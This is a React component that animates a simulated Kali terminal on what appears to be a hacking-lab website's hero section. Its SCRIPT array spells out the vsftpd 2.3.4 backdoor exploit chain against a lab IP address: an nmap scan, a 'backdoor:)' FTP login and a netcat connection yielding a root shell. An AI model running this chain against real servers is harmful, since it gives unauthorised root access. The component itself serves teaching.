"use client";
import { useEffect, useState } from "react";

const SCRIPT: { cmd: string; out: string[] }[] = [
  { cmd: "nmap -sV 192.168.56.20", out: ["PORT     STATE SERVICE  VERSION", "21/tcp   open  ftp      vsftpd 2.3.4", "6200/tcp closed unknown  ← interesting…"] },
  { cmd: "telnet 192.168.56.20 21", out: ["Trying 192.168.56.20...", "220 (vsFTPd 2.3.4)"] },
  { cmd: "USER backdoor:)", out: ["331 Please specify the password."] },
  { cmd: "nc 192.168.56.20 6200", out: ["whoami", "root"] },
];

/** Animated hero terminal that types a real exploit chain. */
export default function HeroTerminal() {
  const [lines, setLines] = useState<{ text: string; kind: "cmd" | "out" | "win" }[]>([]);
  useEffect(() => {
    let cancelled = false;
    const timers: ReturnType<typeof setTimeout>[] = [];
    const later = (fn: () => void, ms: number) => { const t = setTimeout(fn, ms); timers.push(t); };

    function typeCommand(step: number, char: number) {
      if (cancelled) return;
      const s = SCRIPT[step];
      if (char <= s.cmd.length) {
        setLines((prev) => {
          const next = [...prev];
          const last = next[next.length - 1];
          if (last && last.kind === "cmd") next[next.length - 1] = { text: s.cmd.slice(0, char), kind: "cmd" };
          else next.push({ text: s.cmd.slice(0, char), kind: "cmd" });
          return next;
        });
        later(() => typeCommand(step, char + 1), 34 + Math.random() * 40);
      } else {
        let d = 350;
        s.out.forEach((o) => {
          later(() => !cancelled && setLines((prev) => [...prev, {
            text: o, kind: o === "root" ? "win" : "out",
          }]), d);
          d += 260;
        });
        later(() => { if (!cancelled && step + 1 < SCRIPT.length) typeCommand(step + 1, 0); }, d + 500);
      }
    }
    later(() => typeCommand(0, 0), 700);
    // loop
    const loop = setInterval(() => {
      if (cancelled) return;
      setLines([]); typeCommand(0, 0);
    }, 16000);
    return () => { cancelled = true; timers.forEach(clearTimeout); clearInterval(loop); };
  }, []);

  return (
    <div className="term-shell overflow-hidden anim-float-soft" role="img" aria-label="Animated demo: hacking the vsftpd backdoor in the simulated terminal">
      <div className="flex items-center gap-2 px-4 py-3 border-b border-white/10">
        <span className="w-3 h-3 rounded-full bg-[#ff5f57]" />
        <span className="w-3 h-3 rounded-full bg-[#febc2e]" />
        <span className="w-3 h-3 rounded-full bg-[#28c840]" />
        <span className="ml-2 font-mono text-xs text-zinc-500">kali@kali: ~/lab</span>
        <span className="ml-auto chip !py-0.5 !text-[10px]" style={{ borderColor: "#22c55e55", color: "#4ade80", background: "#22c55e11" }}>SIMULATED</span>
      </div>
      <div className="p-4 sm:p-5 font-mono text-[13px] sm:text-sm leading-6 min-h-[248px]">
        {lines.map((l, i) => (
          <div key={i} className={l.kind === "cmd" ? "text-white" : l.kind === "win" ? "text-[#4ade80] font-bold" : "text-zinc-400"}>
            {l.kind === "cmd" && <span className="text-[#4ade80]">kali@kali:~$ </span>}
            {l.text}
            {l.kind === "cmd" && i === lines.length - 1 && <span className="term-caret ml-1" />}
          </div>
        ))}
        {lines.length === 0 && <span className="term-caret" />}
      </div>
    </div>
  );
}
